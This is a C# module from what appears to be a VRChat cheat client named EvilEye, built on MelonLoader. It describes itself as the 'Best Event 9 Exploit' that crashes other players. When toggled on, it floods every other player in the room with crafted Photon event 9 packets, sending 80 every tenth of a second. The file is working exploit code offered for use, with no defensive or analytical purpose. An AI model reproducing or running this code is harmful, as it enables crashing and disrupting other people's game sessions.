using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using EvilEye.SDK;
using EvilEye.SDK.PhotonSDK;
using ExitGames.Client.Photon;
using MelonLoader;
using UnityEngine;

namespace EvilEye.Module.Exploit
{
    internal class Event9 : BaseModule
    {
        public Event9() : base("Event 9V3", "Best Event 9 Exploit And Crashes Instead Of lag", Main.Instance.exploitEventGroup, null, true) { }

        public override void OnEnable()
        {
            MelonCoroutines.Start(Desync());
        }

        IEnumerator Desync()
        {
            byte[] LagData = new byte[8];
            int idfirst2 = int.Parse(PlayerWrapper.LocalPlayer().GetVRCPlayerApi().playerId + "00001");
            byte[] IDOut2 = BitConverter.GetBytes(idfirst2);
            Buffer.BlockCopy(IDOut2, 0, LagData, 0, 4);
            while (this.toggled)
            {
                for (int i = 0; i < 80; i++)
                {
                    PhotonExtensions.OpRaiseEvent(9, LagData, new Photon.Realtime.RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others,
                        field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache
                    }, SendOptions.SendReliable);
                    if (!this.toggled)
                        break;
                }
                yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }
    }
}